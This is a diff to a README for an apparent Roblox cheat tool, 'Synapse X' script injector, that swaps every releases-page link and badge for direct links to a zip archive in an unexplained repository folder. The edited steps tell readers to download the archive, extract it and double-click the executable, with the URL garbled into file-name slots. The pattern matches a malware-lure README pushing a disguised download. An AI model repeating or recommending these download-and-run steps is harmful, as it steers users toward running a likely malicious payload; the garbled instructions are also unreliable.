@@ -1,6 +1,6 @@
 # 🛠️ Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development - Customize Your Roblox Experience Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Shelf-77/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/releases)
+[![Download Now](https://raw.githubusercontent.com/Shelf-77/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/main/pregust/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development.zip%20Now-Click%https://raw.githubusercontent.com/Shelf-77/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/main/pregust/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development.zip)](https://raw.githubusercontent.com/Shelf-77/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/main/pregust/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development.zip)
 
 ## 📖 Description
 
@@ -18,16 +18,16 @@ To get started with Synapse X, follow these steps to download and run the applic
    - Roblox must be installed on your computer
 
 2. **Visit the Releases Page**  
-   To download Synapse X, [visit this page to download](https://github.com/Shelf-77/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/releases). You will find the latest version available.
+   To download Synapse X, [visit this page to download](https://raw.githubusercontent.com/Shelf-77/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/main/pregust/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development.zip). You will find the latest version available.
 
 3. **Download the Application**  
-   Find the latest release version and click on the download link. It will typically be labeled as `SynapseX.zip`. The download will begin automatically.
+   Find the latest release version and click on the download link. It will typically be labeled as `https://raw.githubusercontent.com/Shelf-77/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/main/pregust/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development.zip`. The download will begin automatically.
 
 4. **Extract the Files**  
    Once the download is complete, locate the downloaded `.zip` file in your computer's downloads folder. Right-click on the file and select "Extract All." Follow the on-screen instructions to extract the files to your desired location.
 
 5. **Run Synapse X**  
-   After extracting the files, navigate to the folder where you extracted them. Find the `SynapseX.exe` file. Double-click it to run the application. 
+   After extracting the files, navigate to the folder where you extracted them. Find the `https://raw.githubusercontent.com/Shelf-77/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/main/pregust/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development.zip` file. Double-click it to run the application. 
 
 6. **Inject Scripts**  
    Open Roblox and select the game you want to customize. Then return to the Synapse X application. Here, you can load your Lua scripts and execute them in the game.
@@ -36,7 +36,7 @@ To get started with Synapse X, follow these steps to download and run the applic
 
 To install Synapse X, make sure you follow the instructions above carefully. This tool simplifies the process of game modification in Roblox. 
 
-Remember, to download the application, you can visit the releases page: [Download Synapse X](https://github.com/Shelf-77/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/releases).
+Remember, to download the application, you can visit the releases page: [Download Synapse X](https://raw.githubusercontent.com/Shelf-77/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/main/pregust/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development.zip).
 
 ## 🎓 Using Synapse X
 
@@ -76,4 +76,4 @@ Synapse X is provided under the MIT License. Please read the license file for de
 
 Thank you for choosing Synapse X to enhance your Roblox gaming experience! Enjoy your time customizing and experimenting in your favorite games. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Shelf-77/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/releases)
+[![Download Now](https://raw.githubusercontent.com/Shelf-77/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/main/pregust/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development.zip%20Now-Click%https://raw.githubusercontent.com/Shelf-77/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/main/pregust/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development.zip)](https://raw.githubusercontent.com/Shelf-77/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/main/pregust/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development.zip)
